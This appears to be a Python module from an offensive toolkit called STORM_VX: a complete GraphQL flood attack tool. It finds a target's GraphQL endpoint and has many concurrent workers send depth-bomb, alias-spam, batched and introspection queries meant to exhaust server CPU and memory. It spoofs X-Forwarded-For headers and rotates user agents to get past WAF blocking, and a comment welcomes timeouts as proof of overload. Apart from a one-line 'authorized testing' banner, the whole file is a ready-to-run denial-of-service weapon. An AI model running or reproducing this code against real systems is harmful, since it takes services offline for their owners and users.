#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF GraphQL Flood — GraphQL Flood Attack Module                         ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Discovers GraphQL endpoints and sends expensive queries to stress      ║
║  the server. Uses depth bombs, alias spam, and batch queries to         ║
║  maximize server-side processing per request.                           ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
import json
from typing import Dict, Optional, List
from urllib.parse import urlparse

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


class GraphQLFloodAttacker:
    """
    GraphQL Flood Attack.

    If the target has a GraphQL endpoint, sends expensive queries
    to maximize server-side CPU and memory usage per request.

    Attack types:
    1. Depth bomb: Deeply nested queries (user -> posts -> comments -> author -> ...)
    2. Alias spam: Same query repeated with different aliases
    3. Batch queries: Multiple queries in a single request (array batching)
    4. Introspection: Schema discovery queries (heavy on some servers)

    ArvanCloud blocking codes: 403, 429, 500, 503
    """

    # Possible GraphQL endpoint paths
    GQL_ENDPOINTS = [
        "/graphql", "/graphiql", "/api/graphql", "/query", "/gql",
        "/api/graph", "/v1/graphql", "/v2/graphql", "/api/query",
        "/api/gql", "/graphql/console", "/playground", "/api/v1/graphql",
        "/admin/graphql", "/api/public/graphql", "/services/graphql",
    ]

    def __init__(self, url: str, workers: int = 100, timeout: int = 15):
        self.url = url
        self.workers = workers
        self.timeout = timeout
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.base_url = f"{self.parsed.scheme}://{self.host}"

        # Discovered GraphQL info
        self._gql_endpoint: Optional[str] = None
        self._gql_schema: Optional[Dict] = None
        self._discovered_types: List[str] = []

        # Stats tracking
        self.stats = {
            "total_queries": 0,
            "successful_queries": 0,
            "waf_blocked": 0,
            "server_errors": 0,
            "timeouts": 0,
            "errors": 0,
            "depth_bombs": 0,
            "alias_spams": 0,
            "batch_queries": 0,
            "introspection_queries": 0,
            "avg_response_time": 0,
            "endpoint_discovered": False,
            "response_times": [],
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0

    async def _update_stats(self, key: str, delta: int = 1):
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _set_stats(self, key: str, value):
        async with self._lock:
            self.stats[key] = value

    async def _get_stats(self) -> Dict:
        async with self._lock:
            return dict(self.stats)

    def _generate_depth_bomb(self, depth: int = 10) -> str:
        """Generate a deeply nested GraphQL query (depth bomb).

        The deeper the query, the more recursive resolution the server
        must perform, consuming CPU and memory.
        """
        # Common GraphQL field names that might exist
        fields = ["user", "users", "post", "posts", "comment", "comments",
                   "author", "category", "categories", "tag", "tags",
                   "item", "items", "product", "products", "article",
                   "articles", "page", "pages", "node", "nodes", "edge", "edges"]

        query_parts = []
        indent = "  "

        # Build from inside out
        inner_field = "id name"
        for d in range(depth, 0, -1):
            field_name = random.choice(fields)
            query_parts.append(indent * d + f"{field_name} {{")
        query_parts.append(indent * (depth + 1) + inner_field)
        for d in range(depth):
            query_parts.append(indent * (depth - d) + "}")

        # Wrap in a query
        full_query = "query {\n" + "\n".join(query_parts) + "\n}"
        return full_query

    def _generate_alias_spam(self, alias_count: int = 100) -> str:
        """Generate a query with many aliases for the same field.

        { a1: users { name }, a2: users { name }, ... a100: users { name } }
        This forces the server to resolve the same query N times.
        """
        field = random.choice(["users", "posts", "items", "products", "articles"])
        sub_fields = random.choice(["id name", "id title", "id email", "name email"])

        aliases = []
        for i in range(alias_count):
            alias = f"a{i}"
            aliases.append(f"  {alias}: {field} {{ {sub_fields} }}")

        full_query = "query {\n" + ",\n".join(aliases) + "\n}"
        return full_query

    def _generate_batch_query(self, batch_size: int = 50) -> str:
        """Generate a batch of queries as a JSON array.

        Many GraphQL servers accept an array of queries in a single
        request, processing all of them. This multiplies server load.
        """
        queries = []
        for i in range(batch_size):
            field = random.choice(["users", "posts", "items", "products"])
            sub = random.choice(["id name", "id title", "name"])
            query = f"query {{ {field} {{ {sub} }} }}"
            queries.append({"query": query})

        return json.dumps(queries)

    def _generate_introspection_query(self) -> str:
        """Generate a GraphQL introspection query.

        Introspection queries can be expensive on large schemas
        and some servers don't disable them in production.
        """
        return """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        fragment InputValue on __InputValue {
          name
          description
          type {
            ...TypeRef
          }
          defaultValue
        }
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """

    def _generate_random_query(self) -> tuple:
        """Generate a random attack query. Returns (query_type, query_str)."""
        attack_type = random.choices(
            ["depth_bomb", "alias_spam", "batch", "introspection", "simple"],
            weights=[30, 25, 20, 10, 15],
            k=1
        )[0]

        if attack_type == "depth_bomb":
            depth = random.randint(5, 15)
            return "depth_bomb", self._generate_depth_bomb(depth)
        elif attack_type == "alias_spam":
            count = random.randint(20, 100)
            return "alias_spam", self._generate_alias_spam(count)
        elif attack_type == "batch":
            size = random.randint(10, 50)
            return "batch", self._generate_batch_query(size)
        elif attack_type == "introspection":
            return "introspection", self._generate_introspection_query()
        else:
            # Simple query
            field = random.choice(["users", "posts", "items", "products", "articles"])
            return "simple", f"query {{ {field} {{ id name }} }}"

    async def _discover_graphql(self, stop_event: asyncio.Event) -> bool:
        """Discover GraphQL endpoint by trying common paths."""
        print(f"  {C.CY}[GQL-FLOOD] Discovering GraphQL endpoint...{C.RS}")

        timeout_obj = aiohttp.ClientTimeout(total=self.timeout)

        for endpoint in self.GQL_ENDPOINTS:
            if stop_event.is_set():
                break

            try:
                async with aiohttp.ClientSession(timeout=timeout_obj) as session:
                    url = f"{self.base_url}{endpoint}"

                    # Try a simple introspection query
                    introspection = '{"query": "{ __schema { queryType { name } } }"}'
                    headers = {
                        "Content-Type": "application/json",
                        "User-Agent": random_ua(),
                        "Accept": "application/json",
                    }

                    async with session.post(url, data=introspection, headers=headers, ssl=False) as resp:
                        if resp.status == 200:
                            try:
                                data = await resp.json(content_type=None)
                                if "data" in data or "errors" in data:
                                    self._gql_endpoint = endpoint
                                    self._discovered_types = []
                                    if "data" in data and data["data"] and "__schema" in data["data"]:
                                        self._gql_schema = data["data"]["__schema"]
                                    print(f"  {C.G}[GQL-FLOOD] Found GraphQL endpoint: {endpoint}{C.RS}")
                                    return True
                            except Exception:
                                pass

                        elif resp.status in (403, 429, 500, 503):
                            # WAF blocking — might still be a GraphQL endpoint
                            print(f"  {C.Y}[GQL-FLOOD] WAF blocked on: {endpoint}{C.RS}")

                        elif resp.status == 404:
                            continue

                        elif resp.status == 405:
                            # Method not allowed — might be GET-only
                            try:
                                async with session.get(url, headers=headers, ssl=False) as resp2:
                                    if resp2.status == 200:
                                        data = await resp2.json(content_type=None)
                                        if "data" in data or "errors" in data:
                                            self._gql_endpoint = endpoint
                                            print(f"  {C.G}[GQL-FLOOD] Found GraphQL endpoint (GET): {endpoint}{C.RS}")
                                            return True
                            except Exception:
                                pass

            except asyncio.TimeoutError:
                pass
            except Exception:
                pass

        # If no endpoint found, default to /graphql and try anyway
        print(f"  {C.Y}[GQL-FLOOD] No GraphQL endpoint found, defaulting to /graphql{C.RS}")
        self._gql_endpoint = "/graphql"
        return False

    async def _graphql_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that sends expensive GraphQL queries."""
        endpoint = self._gql_endpoint or "/graphql"

        while not stop_event.is_set():
            query_type, query_str = self._generate_random_query()

            try:
                timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
                async with aiohttp.ClientSession(timeout=timeout_obj) as session:
                    url = f"{self.base_url}{endpoint}"

                    headers = {
                        "Content-Type": "application/json",
                        "User-Agent": random_ua(),
                        "Accept": "application/json",
                    }

                    # Add random IP headers
                    if random.random() > 0.3:
                        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

                    # Build request payload
                    t = time.time()

                    if query_type == "batch":
                        # Batch queries use JSON array
                        payload = query_str
                    else:
                        payload = json.dumps({"query": query_str})

                    async with session.post(url, data=payload, headers=headers, ssl=False) as resp:
                        elapsed = time.time() - t
                        status = resp.status

                        await self._update_stats("total_queries")

                        # Track response time
                        async with self._lock:
                            self.stats["response_times"].append(elapsed)
                            if len(self.stats["response_times"]) > 1000:
                                self.stats["response_times"] = self.stats["response_times"][-500:]

                        if status == 200:
                            await self._update_stats("successful_queries")
                        elif status in (403, 429, 500, 503):
                            await self._update_stats("waf_blocked")
                        elif status >= 500:
                            await self._update_stats("server_errors")
                        elif status == 429:
                            await self._update_stats("waf_blocked")

                        # Update query type counter
                        if query_type == "depth_bomb":
                            await self._update_stats("depth_bombs")
                        elif query_type == "alias_spam":
                            await self._update_stats("alias_spams")
                        elif query_type == "batch":
                            await self._update_stats("batch_queries")
                        elif query_type == "introspection":
                            await self._update_stats("introspection_queries")

            except asyncio.TimeoutError:
                await self._update_stats("timeouts")
                # Timeout might mean server is overloaded — good!
            except aiohttp.ClientPayloadError:
                await self._update_stats("errors")
            except aiohttp.ClientError:
                await self._update_stats("errors")
            except OSError:
                await self._update_stats("errors")
            except Exception:
                await self._update_stats("errors")

            # Brief pause between queries
            await asyncio.sleep(random.uniform(0.01, 0.05))

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            stats = await self._get_stats()

            total = stats.get("total_queries", 0)
            success = stats.get("successful_queries", 0)
            blocked = stats.get("waf_blocked", 0)
            errors = stats.get("server_errors", 0)
            timeouts = stats.get("timeouts", 0)
            depth = stats.get("depth_bombs", 0)
            alias = stats.get("alias_spams", 0)
            batch = stats.get("batch_queries", 0)
            introspection = stats.get("introspection_queries", 0)

            qps = total / max(elapsed, 1)

            # Calculate average response time
            response_times = stats.get("response_times", [])
            avg_rt = sum(response_times[-100:]) / max(len(response_times[-100:]), 1) if response_times else 0

            print(
                f"{C.CY}[GQL-FLOOD]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Queries: {C.W}{total:,}{C.RS} ({qps:.1f}/s) | "
                f"OK: {C.G}{success:,}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS} | "
                f"Timeouts: {C.Y}{timeouts}{C.RS} | "
                f"Avg RT: {C.B}{avg_rt*1000:.0f}ms{C.RS}"
            )

            print(
                f"  Types: Depth={C.R}{depth}{C.RS} | "
                f"Alias={C.M}{alias}{C.RS} | "
                f"Batch={C.Y}{batch}{C.RS} | "
                f"Intro={C.CY}{introspection}{C.RS} | "
                f"Endpoint: {C.G}{self._gql_endpoint or 'N/A'}{C.RS}"
            )

            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        print(f"{C.BD}[GQL-FLOOD] Starting GraphQL Flood attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  Strategy: Discover GraphQL, send expensive queries{C.RS}")

        # Phase 1: Discover GraphQL endpoint
        if HAS_AIOHTTP:
            discovered = await self._discover_graphql(stop_event)
            async with self._lock:
                self.stats["endpoint_discovered"] = discovered
        else:
            print(f"  {C.R}[GQL-FLOOD] aiohttp not available, using default endpoint{C.RS}")
            self._gql_endpoint = "/graphql"

        # Phase 2: Launch flood workers
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._graphql_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["queries_per_second"] = round(
            final_stats.get("total_queries", 0) / max(elapsed, 1), 2
        )
        final_stats["gql_endpoint"] = self._gql_endpoint

        # Calculate final average response time
        response_times = final_stats.get("response_times", [])
        if response_times:
            final_stats["avg_response_time_ms"] = round(
                sum(response_times) / len(response_times) * 1000, 2
            )
            final_stats["max_response_time_ms"] = round(max(response_times) * 1000, 2)
            final_stats["p95_response_time_ms"] = round(
                sorted(response_times)[int(len(response_times) * 0.95)] * 1000, 2
            )

        # Remove raw response times from final stats
        final_stats.pop("response_times", None)

        print(f"\n{C.BD}[GQL-FLOOD] Attack finished{C.RS}")
        print(f"  Total queries: {C.W}{final_stats.get('total_queries', 0):,}{C.RS}")
        print(f"  Successful: {C.G}{final_stats.get('successful_queries', 0):,}{C.RS}")
        print(f"  WAF blocked: {C.R}{final_stats.get('waf_blocked', 0)}{C.RS}")
        print(f"  Timeouts: {C.Y}{final_stats.get('timeouts', 0)}{C.RS}")
        print(f"  Depth bombs: {C.R}{final_stats.get('depth_bombs', 0)}{C.RS}")
        print(f"  Alias spams: {C.M}{final_stats.get('alias_spams', 0)}{C.RS}")
        print(f"  Batch queries: {C.Y}{final_stats.get('batch_queries', 0)}{C.RS}")
        print(f"  QPS: {C.CY}{final_stats.get('queries_per_second', 0)}{C.RS}")
        print(f"  Endpoint: {C.G}{self._gql_endpoint or 'N/A'}{C.RS}")
        if final_stats.get("avg_response_time_ms"):
            print(f"  Avg response time: {C.B}{final_stats['avg_response_time_ms']}ms{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
